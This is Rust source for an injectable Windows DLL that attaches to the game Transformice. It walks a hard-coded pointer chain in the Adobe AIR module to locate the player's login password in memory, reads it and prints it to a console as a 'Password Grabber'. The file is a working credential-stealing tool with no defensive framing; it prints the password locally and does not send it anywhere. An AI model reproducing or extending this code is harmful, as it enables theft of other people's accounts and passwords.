mod bindings;
mod mem;
mod transformice;

use bindings::*;
use mem::*;
use transformice::*;

pub const NULL_MUT: *mut c_void = std::ptr::null_mut();
pub const MODULE_NAME: &'static str = "Adobe AIR.dll";
pub const MODULE_PATH: &'static str = "Adobe AIR\\Versions\\1.0\\Adobe AIR.dll";


unsafe extern "system" fn main_grabber_thread(hinst_dll: LPVOID) -> DWORD {
    AllocConsole();

    let module_handle = get_adobe_air_address();

    if module_handle.is_null() {
        CreateThread(
            ptr::null_mut(),
            0,
            Some(main_grabber_thread),
            hinst_dll as LPVOID,
            0,
            ptr::null_mut(),
        );

        return 0;
    }

    let module_base: uintptr_t = module_handle as uintptr_t;

    println!("[Transformice.exe] Waiting for user to log-in...");

    let mut password_address: uintptr_t = 0;
    while password_address == 0 {
        password_address = find_addr(module_base + 0x012CB048, &OFFSETS);

        thread::sleep(Duration::from_millis(500));
    }

    println!("[Password Grabber] Password address: 0x{:X}", password_address);

    let password = read_password(password_address as *mut u8, 50);

    if password.len() < 8 {
        println!("[Password Grabber] Failed to grab the password");
    } else {
        println!("[Password Grabber] Grabbed password: <{}>", password);
    }

    println!();
    FreeLibraryAndExitThread(hinst_dll as *mut _, 0);
    0
}


#[no_mangle]
#[allow(non_snake_case)]
pub extern "stdcall" fn DllMain(
    hinst_dll: HINSTANCE,
    fdw_reason: DWORD,
    lpv_reserved: LPVOID
) -> BOOL {
    match fdw_reason {
        DLL_PROCESS_ATTACH => { unsafe {
            DisableThreadLibraryCalls(hinst_dll);
            CloseHandle(CreateThread(
                ptr::null_mut(),
                0,
                Some(main_grabber_thread),
                hinst_dll as LPVOID,
                0,
                ptr::null_mut(),
            ));
        } }

        DLL_PROCESS_DETACH => {
            if !lpv_reserved.is_null() {

            }
        }

        _ => {}
    }

    TRUE
}
